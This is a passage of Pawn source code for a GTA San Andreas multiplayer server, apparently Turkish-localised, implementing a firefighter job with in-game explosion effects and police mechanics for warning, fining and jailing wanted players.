	    AVehicleData[APlayerData[playerid][VehicleID]][MafiaLoad] = false; // The player has no trailer, so clear his main vehicle as wanted by the mafia

		// Clear all data about the job from the player, so he can start a new one

		APlayerData[playerid][JobStarted] = false;

		APlayerData[playerid][JobStep] = 0;

		APlayerData[playerid][LoadID] = 0;

		APlayerData[playerid][JobLoc1] = 0;

		APlayerData[playerid][JobLoc2] = 0;

		APlayerData[playerid][MafiaLoad] = false;



		// Delete the checkpoint

		DisablePlayerCheckpoint(playerid);

		// Reset the missiontext

		//TextDrawSetString(APlayerData[playerid][MissionText], Trucker_NoJobText);

		// Kill the LoadingTimer

		KillTimer(APlayerData[playerid][LoadingTimer]);

	}



	return 1;

}

// ************************************************************************************************************************************************************
// PPC_MissionsFire
// ************************************************************************************************************************************************************

// Forward the public function used as a timer to load/unload your vehicle

forward Fire_Firetruck_LoadUnload(playerid);



// This function is called when a G wants to start a job by entering "/work"

Fire_StartRandomJob(playerid)

{

	// Setup local variables

	new FireJobSet;



	// Check the vehicle-model of the player to decide which job the player can get

	switch (GetVehicleModel(GetPlayerVehicleID(playerid)))

	{

		case VehicleFiretruck: // Select a random job for G

			FireJobSet = Fire_Firetruck_SetRandomJob(playerid);

	}



	// Check if a job was set correctly

	switch (FireJobSet)

	{

		case 1, 2:

		{

		    // Setup local variables

			new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, LoadMsg[128];



			// Job has started

			APlayerData[playerid][JobStarted] = true;



			// Set jobstep to 1 (going to load the goods)

			APlayerData[playerid][JobStep] = 1;

			// Get the startlocation, endlocation and the load texts

			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);

			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);

			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);

			// Combine it all into a string for the TextDraw (the player can see this all the time) to describe the mission

			//format(RouteText, 255, TXT_TransportingFromToPickup, Load, StartLoc, EndLoc);

			// Set the TextDraw so the player can see it

			//TextDrawSetString(APlayerData[playerid][MissionText], RouteText);

			// Grab the x, y, z positions for the first location

			x = ALocations[APlayerData[playerid][JobLoc1]][LocX];

			y = ALocations[APlayerData[playerid][JobLoc1]][LocY];

			z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];

			// Create a checkpoint where the player should load the goods

			SetPlayerCheckpoint(playerid, x, y, z, 7);

			// Inform the player that he must load his goods

			format(LoadMsg, 128, TXT_PickupCargoAtFire, Load, StartLoc);

			SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);

		}

	}



	return 1;

}



// This function sets a random job for a plane vehicle and returns 1 if a job has been set

// The function returns 0 if a job couldn't be set (if the player is driving an invalid vehicle to start Ging-jobs)

Fire_Firetruck_SetRandomJob(playerid)

{

	// If the player is the driver of the vehicle (GetPlayerVehicleSeat returns -1 if the player is not in a vehicle)

	if (GetPlayerVehicleSeat(playerid) == 0)

	{

		// Check the vehicle-model of the player to decide which job the player can get

		switch (GetVehicleModel(GetPlayerVehicleID(playerid)))

		{

			case VehicleFiretruck:

			{

				// Get a random LoadID from the G-products (only the planes)

				APlayerData[playerid][LoadID] = Product_GetRandom(PCV_FireFiretruck);

				// Also get a random start-location and end-location

				APlayerData[playerid][JobLoc1] = Product_GetRandomStartLoc(APlayerData[playerid][LoadID]);

				APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);



				// Make sure the destination is not closeby (G-locations are ALL includes in the array)

				while (Locations_CheckDistance(APlayerData[playerid][JobLoc1], APlayerData[playerid][JobLoc2], 50.0) == 0)

				{

				    // If both locations are too close together, keep searching for a random delivery-location that's further away

				    APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);

				}



				// Return 1 to indicate that a job has been set correctly

				return 1;

			}

		}

	}



// If no job could be set correctly, return 0

return 0;

}



// This function is called when a G enters a checkpoint

Fire_OnPlayerEnterCheckpoint(playerid)

{

	new LoadMsg[128];



    // Check the jobstep

    switch (APlayerData[playerid][JobStep])

    {

		// JobStep is 1 (G is loading his goods at the checkpoint)

 		case 1: format(LoadMsg, 128, TXT_LoadingGoodsFire, ALoads[APlayerData[playerid][LoadID]][LoadName]);

		// JobStep is 2 (G is unloading his goods at the checkpoint)

		case 2: format(LoadMsg, 128, TXT_UnloadingGoodsFire, ALoads[APlayerData[playerid][LoadID]][LoadName]);

    }



	// Disable the player's actions (he cannot move anymore)

	TogglePlayerControllable(playerid, 0);



	// Check the vehiclemodel of the player

	new vehicleid = GetPlayerVehicleID(playerid);

	switch (GetVehicleModel(vehicleid))

	{

	    case VehicleFiretruck: // A plane needs 5 seconds to load/unload

		{

			// Show the message to inform him what he's doing (loading/unloading)

			GameTextForPlayer(playerid, LoadMsg, 5000, 5);

			// Start a timer (Public function "LoadUnload(playerid)" gets called when the timer runs out)

			APlayerData[playerid][LoadingTimer] = SetTimerEx("Fire_Firetruck_LoadUnload", 5000, false, "d" , playerid);

		}

	}



	return 1;

}







// After a G entered a checkpoint, a timer is created. This function is called when the timer runs out

public Fire_Firetruck_LoadUnload(playerid)

{

	// Check the JobStep

	switch (APlayerData[playerid][JobStep])

	{

		case 1: // Player must load his goods

		{

		    // Setup local variables

			new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, UnloadMsg[100];

			// Set JobStep to 2 (unloading goods)

			APlayerData[playerid][JobStep] = 2;

			// Delete the loading-checkpoint

			DisablePlayerCheckpoint(playerid);

			// Get the startlocation, endlocation and the load texts

			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);

			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);

			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);



			// Update the missiontext

			//format(RouteText, 255, TXT_TransportingFromToDeliver, Load, StartLoc, EndLoc);

			// Set the TextDraw so the player can see it

			//TextDrawSetString(APlayerData[playerid][MissionText], RouteText);



			// Grab the x, y, z positions for the second location (to unload the goods)

			x = ALocations[APlayerData[playerid][JobLoc2]][LocX];

			y = ALocations[APlayerData[playerid][JobLoc2]][LocY];

			z = ALocations[APlayerData[playerid][JobLoc2]][LocZ];

			// Create a checkpoint where the player should unload the goods

			SetPlayerCheckpoint(playerid, x, y, z, 7);

			// Inform the player that he must unload his goods

			format(UnloadMsg, 100, TXT_DeliverCargoToFire, Load, EndLoc);

			SendClientMessage(playerid, 0xFFFFFFFF, UnloadMsg);

			//patlamalar LS ev
			if (IsPlayerInRangeOfPoint(playerid, 7.0, 2079.0891,-1171.7212,23.8358))
		    {
		    	CreateExplosion(2090.8093,-1169.9316,25.5938, 1, 100.0);
		    	CreateExplosion(2090.8093,-1169.9316,25.5938, 1, 100.0);
		    	CreateExplosion(2090.8093,-1169.9316,25.5938, 1, 100.0);
		    	CreateExplosion(2090.8093,-1169.9316,25.5938, 1, 100.0);
		    	CreateExplosion(2090.8093,-1169.9316,25.5938, 1, 100.0);
		    }
		    else//patlama Ls Hastane
		    if (IsPlayerInRangeOfPoint(playerid, 7.0, 2031.9377,-1408.5579,17.1641))
		    {
		        CreateExplosion(2035.2828,-1404.7429,17.2516, 1, 100.0);
		        CreateExplosion(2035.2828,-1404.7429,17.2516, 1, 100.0);
		        CreateExplosion(2035.2828,-1404.7429,17.2516, 1, 100.0);
		        CreateExplosion(2035.2828,-1404.7429,17.2516, 1, 100.0);
		        CreateExplosion(2035.2828,-1404.7429,17.2516, 1, 100.0);
			}//patlama Depo Ls
			else
			if (IsPlayerInRangeOfPoint(playerid, 7.0, 2369.6438,-2286.6226,13.3921))
		    {
			    CreateExplosion(2363.7603,-2284.9824,14.3126, 1, 100.0);
			    CreateExplosion(2363.7603,-2284.9824,14.3126, 1, 100.0);
			    CreateExplosion(2363.7603,-2284.9824,14.3126, 1, 100.0);
			    CreateExplosion(2363.7603,-2284.9824,14.3126, 1, 100.0);
			    CreateExplosion(2363.7603,-2284.9824,14.3126, 1, 100.0);
		    }
		    else//ls Airport
			if (IsPlayerInRangeOfPoint(playerid, 7.0, 1633.2726,-2325.3623,13.5469))
		    {
			    CreateExplosion(1632.0319,-2332.3145,13.5469, 1, 100.0);
			    CreateExplosion(1632.0319,-2332.3145,13.5469, 1, 100.0);
			    CreateExplosion(1632.0319,-2332.3145,13.5469, 1, 100.0);
			    CreateExplosion(1632.0319,-2332.3145,13.5469, 1, 100.0);
			    CreateExplosion(1632.0319,-2332.3145,13.5469, 1, 100.0);
			}
			else//lv Kumarhane
			if (IsPlayerInRangeOfPoint(playerid, 7.0, 2156.1167,2164.8625,10.6719))
		    {
			    CreateExplosion(2161.0735,2166.3650,10.8125, 1, 100.0);
		        CreateExplosion(2161.0735,2166.3650,10.8125, 1, 100.0);
		        CreateExplosion(2161.0735,2166.3650,10.8125, 1, 100.0);
		        CreateExplosion(2161.0735,2166.3650,10.8125, 1, 100.0);
		        CreateExplosion(2161.0735,2166.3650,10.8125, 1, 100.0);
			}
			else//lv alisveris Merkezi
			if (IsPlayerInRangeOfPoint(playerid, 7.0, 2853.9104,2413.3569,10.8203))
		    {
			    CreateExplosion(2850.3005,2417.4609,11.0690, 1, 100.0);
			    CreateExplosion(2850.3005,2417.4609,11.0690, 1, 100.0);
			    CreateExplosion(2850.3005,2417.4609,11.0690, 1, 100.0);
			    CreateExplosion(2850.3005,2417.4609,11.0690, 1, 100.0);
			    CreateExplosion(2850.3005,2417.4609,11.0690, 1, 100.0);
			}
			else//lv Arena
			if (IsPlayerInRangeOfPoint(playerid, 7.0, 1092.9421,1608.8302,12.5469))
		    {
		        CreateExplosion(1091.8372,1601.3629,12.5469, 1, 100.0);
		        CreateExplosion(1091.8372,1601.3629,12.5469, 1, 100.0);
		        CreateExplosion(1091.8372,1601.3629,12.5469, 1, 100.0);
		        CreateExplosion(1091.8372,1601.3629,12.5469, 1, 100.0);
		        CreateExplosion(1091.8372,1601.3629,12.5469, 1, 100.0);
			}
			else//Sf insaat
			if (IsPlayerInRangeOfPoint(playerid, 7.0, -2058.2886,291.8183,35.5672))
		    {
		        CreateExplosion(-2053.4714,300.3985,35.7746, 1, 100.0);
		        CreateExplosion(-2053.4714,300.3985,35.7746, 1, 100.0);
		        CreateExplosion(-2053.4714,300.3985,35.7746, 1, 100.0);
		        CreateExplosion(-2053.4714,300.3985,35.7746, 1, 100.0);
		        CreateExplosion(-2053.4714,300.3985,35.7746, 1, 100.0);
			}
			else//Sf ev
			if (IsPlayerInRangeOfPoint(playerid, 7.0, -2721.7039,974.8476,54.4679))
		    {
		        CreateExplosion(-2721.7039,974.8476,54.4679, 1, 100.0);
			    CreateExplosion(-2721.7039,974.8476,54.4679, 1, 100.0);
			    CreateExplosion(-2721.7039,974.8476,54.4679, 1, 100.0);
			    CreateExplosion(-2721.7039,974.8476,54.4679, 1, 100.0);
			    CreateExplosion(-2721.7039,974.8476,54.4679, 1, 100.0);
			}
			else//Sf ev 2
			if (IsPlayerInRangeOfPoint(playerid, 7.0, -2801.7107,-132.9697,7.1875))
		    {
		        CreateExplosion(-2793.7361,-132.7856,7.1875, 1, 100.0);
		        CreateExplosion(-2793.7361,-132.7856,7.1875, 1, 100.0);
		        CreateExplosion(-2793.7361,-132.7856,7.1875, 1, 100.0);
		        CreateExplosion(-2793.7361,-132.7856,7.1875, 1, 100.0);
		        CreateExplosion(-2793.7361,-132.7856,7.1875, 1, 100.0);
			}
		}

		case 2: // Player is delivering his goods

		{

		    // Setup local variables

			new StartLoc[50], EndLoc[50], Load[50], Msg1[128], Msg2[128], Name[24];



			// Get the player name

			GetPlayerName(playerid, Name, sizeof(Name));

			// Get the startlocation, endlocation and the load texts

			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);

			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);

			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);



			// Construct the message sent to all players that this player completed a G mission

			format(Msg1, 128, TXT_PlayerCompletedFireJob, Name, Load);

			format(Msg2, 128, TXT_PlayerCompletedFireJobInfo, StartLoc, EndLoc);

			SendClientMessageToAll(0xFFFFFFFF, Msg1);

			SendClientMessageToAll(0xFFFFFFFF, Msg2);







		    // Setup local variables

			new Float:x1, Float:y1, Float:x2, Float:y2, Float:Distance, Message[128], Payment, Skor;

			// Grab the x, y, z positions for the first location (to load the goods)

			x1 = ALocations[APlayerData[playerid][JobLoc1]][LocX];

			y1 = ALocations[APlayerData[playerid][JobLoc1]][LocY];

			// Grab the x, y, z positions for the second location (to unload the goods)

			x2 = ALocations[APlayerData[playerid][JobLoc2]][LocX];

			y2 = ALocations[APlayerData[playerid][JobLoc2]][LocY];

			// Calculate the distance between both points

			Distance = floatsqroot(((x2 - x1) * (x2 - x1)) + ((y2 - y1) * (y2 - y1)));



			// Calculate the payment for the player
			Payment = floatround((Distance * ALoads[APlayerData[playerid][LoadID]][PayPerUnit]), floatround_floor);
			Skor = 2;

			if(VIP[playerid] == 1 || YVIP[playerid] == 1)
			{
 				Payment += 2*Payment;
 				Skor = 6;
			}

			// Reward the player (give cash and points)
			RewardPlayer(playerid, Payment, Skor);



			// Send a message to let the player know he finished his mission and got paid

			format(Message, 128, TXT_RewardJob, Payment);

			SendClientMessage(playerid, 0xFFFFFFFF, Message);



			// Increase the stats for completing a G job

			APlayerData[playerid][StatsFireJobs]++;
			format(Message, 1024, "Itfayeci görevini baþarýyla bitirdi");
			SqlLogYaz(playerid, 7, Message);
			if(APlayerData[playerid][StatsFireJobs] >= 7)
			{
				GivePlayerAchievement(playerid, ItfaiyeciAch, 1); // Baþarým Sistemi
			}
			// Also save the data (in case the server crashes, progress would be lost)

			Oyuncu_Kaydet(playerid);



			// End the current G job (clear mission-data)

			Fire_EndJob(playerid);

		}

	}



    // Enable the player again (he can move again)

	TogglePlayerControllable(playerid, 1);
/*
	// Start the engine again (in case the vehicle was a helicopter, where the engine was turned off by entering a checkpoint)

	new vehicleid = GetPlayerVehicleID(playerid);

	new engine,lights,alarm,doors,bonnet,boot,objective;

	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);

	SetVehicleParamsEx(vehicleid, 1, lights, alarm, doors, bonnet, boot, objective);
*/


	return 1;

}







// This function is used to cleanup the current job

Fire_EndJob(playerid)

{

	// Check if a job has started

	if (APlayerData[playerid][JobStarted] == true)

	{

		// Clear all data about the job from the player, so he can start a new one

		APlayerData[playerid][JobStarted] = false;

		APlayerData[playerid][JobStep] = 0;

		APlayerData[playerid][LoadID] = 0;

		APlayerData[playerid][JobLoc1] = 0;

		APlayerData[playerid][JobLoc2] = 0;



		// Delete the checkpoint

		DisablePlayerCheckpoint(playerid);

		// Reset the missiontext

		//TextDrawSetString(APlayerData[playerid][MissionText], Trucker_NoJobText);

		// Kill the LoadingTimer

		KillTimer(APlayerData[playerid][LoadingTimer]);

	}



	return 1;

}

// ************************************************************************************************************************************************************
// PPC_MissionsPolice
// ************************************************************************************************************************************************************

// Forward the function to timer to check players every second to see if they're wanted
forward Police_CheckWantedPlayers(playerid);
forward UnjailPlayer(playerid);



// This timer is created every time a player changes his class to police
public Police_CheckWantedPlayers(playerid)
{
	// Scan through all players
	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)
	{
		// check if this player is connected
		if (IsPlayerConnected(PlayerToCheck))
		{
		    if(IsPlayerNPC(PlayerToCheck)) continue;
			//Check if that player is wanted
			if (APlayerData[PlayerToCheck][PlayerWanted] > 0)
			{
				if(APlayerData[playerid][PlayerClass] == ClassPolice)
			    {
			    SetPlayerMarkerForPlayer(playerid, PlayerToCheck, 0xFF0000FF); // Make that player red to the police-player
			    }
			}
			else
			{
				// Reset the playercolor based on the player's class
			    switch (APlayerData[PlayerToCheck][PlayerClass])
			    {
			        case ClassTruckDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassTruckDriver);
			        case ClassBusDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBusDriver);
			        case ClassPilot: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPilot);
			        case ClassPolice: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPolice);
			        case ClassMafia: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassMafia);
			        case ClassGemici: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassGemici);
  			        case ClassOduncu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassOduncu);
  			        case ClassRoadWorker: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassRoadWorker);
			        case ClassBalikci: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBalikci);
			        case ClassCopcu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassCopcu);
			        case ClassFBY: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassFBY);
			        case ClassBanka: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBanka);
			        case ClassFire: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassFire);
			        case ClassPboy: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPboy);
                    case ClassKargocu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassKargocu);
                    case ClassDolmusDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassDolmusDriver);
				}
			}
		}
	}
}

// This function gets called when a police player presses the SECUNDAIRY FIRE button (to warn nearby wanted players)
Police_WarnNearbyPlayers(playerid)
{
	// Setup local variables
	new Float:x, Float:y, Float:z, Name[24], Msg[128];

	// Scan through all players
	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)
	{
		// check if this player is connected
		if (IsPlayerConnected(PlayerToCheck))
		{
			// Check if the current player is wanted
			if (APlayerData[PlayerToCheck][PlayerWanted] > 0)
			{
			    // Get the position of this player
			    GetPlayerPos(PlayerToCheck, x, y, z);
			    // Check if the police-player is in range of the player
				if (IsPlayerInRangeOfPoint(playerid, 50.0, x, y, z))
				{
					GameTextForPlayer(PlayerToCheck, TXT_PoliceWarnPlayer, 3000, 4); // Warn the player
					// Also start a timer which gives the player a chance to stop and get a fine
					// If he doesn't stop, the player will be sent to jail when he gets fined
					if (APlayerData[PlayerToCheck][PoliceWarnedMe] == false)
					{
					    APlayerData[PlayerToCheck][PoliceWarnedMe] = true;
						APlayerData[PlayerToCheck][Value_PoliceCanJailMe] = 60;
						APlayerData[PlayerToCheck][Timer_PoliceCanJailMe] = SetTimerEx("Timer_PoliceCanJailPlayer", 5000, true, "i", PlayerToCheck);
					}

					// Let the police player know that he warned the player
					GetPlayerName(PlayerToCheck, Name, sizeof(Name));
					format(Msg, 128, "{00FF00}Bu Oyuncuyu Uyardiniz: {FFFF00}%s", Name);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}
			}
		}
	}

	return 1;
}

// This function gets called when a police player presses the FIRE key (to fine nearby wanted players) when he's on foot
Police_FineNearbyPlayers(playerid)
{
	// Setup local variables
	new Float:x, Float:y, Float:z;

	// Scan through all players
	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)
	{
		// check if this player is connected
		if (IsPlayerConnected(PlayerToCheck))
		{
			// Check if the other player isn't the same police player
			if (PlayerToCheck != playerid)
			{
				// Check if the current player is wanted and the wanted player is driving slowly (below 30 kph)
				if ((APlayerData[PlayerToCheck][PlayerWanted] > 0) && (APlayerData[PlayerToCheck][PlayerSpeed] < 30))
				{
				    // Get the position of this player
				    GetPlayerPos(PlayerToCheck, x, y, z);

				    // Check if the police-player is in range of the player (police player and wanted player must be within 10 meters of eachother)
					if (IsPlayerInRangeOfPoint(playerid, 10.0, x, y, z))
					{
					    // Fine the player
						Police_PayFine(playerid, PlayerToCheck);

						// Exit the function
						return 1;
					}

					// Check if the police-player is in range of the player (he can be inside his vehicle or on foot)
					if (IsPlayerInRangeOfPoint(playerid, 50.0, x, y, z))
					{
						GameTextForPlayer(PlayerToCheck, TXT_PoliceWarnPlayer, 3000, 4); // Warn the player
						// Also start a timer which gives the player a chance to stop and get a fine
						// If he doesn't stop, the player will be sent to jail when he gets fined
						if (APlayerData[PlayerToCheck][PoliceWarnedMe] == false)
						{
						    APlayerData[PlayerToCheck][PoliceWarnedMe] = true;
							APlayerData[PlayerToCheck][Value_PoliceCanJailMe] = DefaultWarnTimeBeforeJail;
							APlayerData[PlayerToCheck][Timer_PoliceCanJailMe] = SetTimerEx("Timer_PoliceCanJailPlayer", 5000, true, "i", PlayerToCheck);
						}
					}
				}
			}
		}
	}

	return 1;
}

// Pay the police player and fine the player
Police_PayFine(playerid, PlayerToFine)
{
	// Setup local variables
	new PoliceName[24], FinedPlayerName[24], PoliceMsg[200], PlayerMsg[200], JailTime, Fine;

	// Get the names of the police player and the wanted player
	GetPlayerName(playerid, PoliceName, 24);
	GetPlayerName(PlayerToFine, FinedPlayerName, 24);

	// Check if the wanted player's timer hasn't ran out yet
	if (APlayerData[PlayerToFine][PoliceCanJailMe] == false)
	{
		// Calculate the fine
		Fine = APlayerData[PlayerToFine][PlayerWanted] * DefaultFinePerStar;
		// Reward the police player (give cash and points)
		RewardPlayer(playerid, Fine, APlayerData[PlayerToFine][PlayerWanted]);
		// Let the police player know that he fined the player
		format(PoliceMsg, 200, TXT_PoliceFinedPlayerReward, FinedPlayerName, Fine);
		SendClientMessage(playerid, 0xFFFFFFFF, PoliceMsg);
		// Let the wanted player pay the fine
		RewardPlayer(PlayerToFine, -Fine, 0);
		format(PlayerMsg, 200, TXT_PlayerGotFinedByPolice, PoliceName, Fine);
		SendClientMessage(PlayerToFine, 0xFFFFFFFF, PlayerMsg);
		// Let the other players know that the police player has fined the wanted player
		format(PoliceMsg, 200, TXT_PoliceFinedPlayer, PoliceName, FinedPlayerName);
		SendClientMessageToAll(0xFFFFFFFF, PoliceMsg);
		// Increase the stats for fining a player
		APlayerData[playerid][StatsPoliceFined]++;
		if(APlayerData[playerid][StatsPoliceFined] >= 20)
		{
		 	GivePlayerAchievement(playerid, PolisAch, 1); // Baþarým Sistemi
		}
		format(PoliceMsg, 200, "[POLIS] %s, %s'e %d$ ceza kesti.", GetName(playerid), GetName(PlayerToFine), Fine);
		BATTLELOG(PoliceMsg);
	}
	else // The wanted player didn't pull over, now the police player has the right to send him to jail and double the fine
	{
	    // Set jailtime
	    JailTime = DefaultJailTime;
		// Calculate the fine (double the normal fine)
		Fine = APlayerData[PlayerToFine][PlayerWanted] * DefaultFinePerStar * 2;
		// Reward the police player (give cash and points)
		RewardPlayer(playerid, Fine, APlayerData[PlayerToFine][PlayerWanted]);
		// Let the police player know that he jailed the wanted player
		format(PoliceMsg, 200, TXT_PoliceJailedPlayerReward, FinedPlayerName, Fine);
		SendClientMessage(playerid, 0xFFFFFFFF, PoliceMsg);
		// Let the wanted player pay a double fine
		RewardPlayer(PlayerToFine, -Fine, 0);
		// Let the player know he's been jailed and for how long
		format(PlayerMsg, 200, TXT_PlayerGotJailedByPolice, PoliceName, (JailTime / 60));
		SendClientMessage(PlayerToFine, 0xFFFFFFFF, PlayerMsg);
		// Let the other players know that the police player has jailed the wanted player
		format(PoliceMsg, 200, TXT_PoliceJailedPlayer, PoliceName, FinedPlayerName, (JailTime / 60));
		SendClientMessageToAll(0xFFFFFFFF, PoliceMsg);
		// Teleport the player to jail
		Police_JailPlayer(PlayerToFine, JailTime);
		// Increase the stats for jailing a player
		APlayerData[playerid][StatsPoliceJailed]++;
		if(APlayerData[playerid][StatsPoliceJailed] >= 20)
		{
			GivePlayerAchievement(playerid, PolisAch, 1); // Baþarým Sistemi
  		}
 		format(PoliceMsg, 200, "[POLIS] %s, %s'e %d$ ceza kesti ve hapse attý.", GetName(playerid), GetName(PlayerToFine), Fine);
		BATTLELOG(PoliceMsg);
	}

	// Clear the wanted player's wanted status (the speedometer will automatically clear all data and kill the timer)
 	APlayerData[PlayerToFine][PlayerWanted] = 0;
    SilahUyari[PlayerToFine] = 0;
	SilahUyariM[PlayerToFine] = 0;
	// Also save the data (in case the server crashes, progress would be lost)
	Oyuncu_Kaydet(playerid);
	Oyuncu_Kaydet(PlayerToFine);

	return 1;
}

// This function ports the player inside the jail and sets a timer to get him back out
Police_JailPlayer(playerid, JailTime)
{
	// First remove the player from his vehicle
	RemovePlayerFromVehicle(playerid);
	// Set the player in the virtual world of the jail (so other players cannot see the jailed players on their radar)
	SetPlayerVirtualWorld(playerid, WORLD_JAIL);
	// Set player interior to the police station in San Fierro
	SetPlayerInterior(playerid, 10);
	// Put the player inside the jail
	SetPlayerPos(playerid, 220.0, 110.0, 999.1);

	// Kelepçele
	SetPlayerAttachedObject(playerid, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.0, 1.168);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CUFFED);

	// Store the jailtime for this player
	APlayerData[playerid][PlayerJailed] = JailTime;
	// Start the jailtimer, which checks every second if the player is allowed to get out
	KillTimer(APlayerData[playerid][PlayerJailedTimer]);
	APlayerData[playerid][PlayerJailedTimer] = SetTimerEx("UnjailPlayer", 1000, true, "i", playerid);

	// If the player started a job, let it fail
	if (APlayerData[playerid][JobStarted] == true)
	{
		// Stop any job that may have started
		switch (APlayerData[playerid][PlayerClass])
		{
			case ClassTruckDriver: Trucker_EndJob(playerid);
  			case ClassBusDriver: BusDriver_EndJob(playerid);
			case ClassPilot: Pilot_EndJob(playerid);
			case ClassPolice: Police_EndJob(playerid);
			case ClassMafia: Mafia_EndJob(playerid);
 			case ClassGemici: Gemici_EndJob(playerid);
  			case ClassOduncu: Oduncu_EndJob(playerid);
   			case ClassBalikci: Balikci_EndJob(playerid);
   			case ClassBanka: Banka_EndJob(playerid);
   			case ClassFire: Fire_EndJob(playerid);
   			case ClassFBY: FBY_EndJob(playerid);
   			case ClassCopcu: StopCopcuGorev(playerid);
   			case ClassPboy: Pboy_EndJob(playerid);
   			case ClassKargocu: StopKargocuGorev(playerid);
   			case ClassDolmusDriver: DolmusDriver_EndJob(playerid);
		}

		// Inform the player that he failed the mission
		GameTextForPlayer(playerid, TXT_FailedMission, 5000, 4);
		// Reduce the player's cash by 1000
		RewardPlayer(playerid, -1000, 0);
	}

	return 1;
}

// This is the timer that runs for every player who's in jail
public UnjailPlayer(playerid)
{
	new JailMsg[20];

	// Check if the player is allowed to leave yet
	if (APlayerData[playerid][PlayerJailed] == 0)
	{
	    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	    RemovePlayerAttachedObject(playerid, 0);

		// Set the player in the normal world
		SetPlayerVirtualWorld(playerid, 0);
		// Set player interior to the outside
		SetPlayerInterior(playerid, 0);
		// Put the player outside the jail (he should spawn at the location where he spawned after login or after choosing a rescue-point)
		SpawnPlayer(playerid);
		// Also, kill the jailtimer
		KillTimer(APlayerData[playerid][PlayerJailedTimer]);
	}
	else
	{
		// Show the remaining jailtime (only if the remaining time is below 60 seconds)
		if (APlayerData[playerid][PlayerJailed] < 60)
		{
			format(JailMsg, 20, TXT_JailTimer, APlayerData[playerid][PlayerJailed]);
			GameTextForPlayer(playerid, JailMsg, 750, 4);
		}
		// Decrease the jailtime by 1 second
        APlayerData[playerid][PlayerJailed] = APlayerData[playerid][PlayerJailed] - 1;
	}
}

// This function gets called when the police player dies (or changes class)
Police_EndJob(playerid)
{
	// Kill the PlayerCheckTimer
	KillTimer(APlayerData[playerid][PlayerCheckTimer]);

	// Scan through all players (to reset them to their default colors for the police-player)
	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)
	{
		// check if this player is connected
		if (IsPlayerConnected(PlayerToCheck))
		{
		    if(IsPlayerNPC(PlayerToCheck)) continue;
			// Reset the playercolor based on the player's class
		    switch (APlayerData[PlayerToCheck][PlayerClass])
		    {
		        case ClassTruckDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassTruckDriver);
		        case ClassBusDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBusDriver);
		        case ClassPilot: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPilot);
		        case ClassPolice: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPolice);
		        case ClassMafia: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassMafia);
		        case ClassGemici: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassGemici);
		        case ClassOduncu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassOduncu);
		        case ClassBalikci: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBalikci);
		        case ClassBanka: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBanka);
		        case ClassFire: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassFire);
		        case ClassFBY: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassFBY);
		        case ClassCopcu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassCopcu);
		        case ClassPboy: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPboy);
		        case ClassKargocu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassKargocu);
		        case ClassDolmusDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassDolmusDriver);
		    }
		}
	}

	return 1;
}

// This timer is started when a wanted player was warned by a police player
forward Timer_PoliceCanJailPlayer(playerid);
public Timer_PoliceCanJailPlayer(playerid)
{
	// Setup local variables
	new Msg[128];

	// Let the player know how much time he has left to pull over
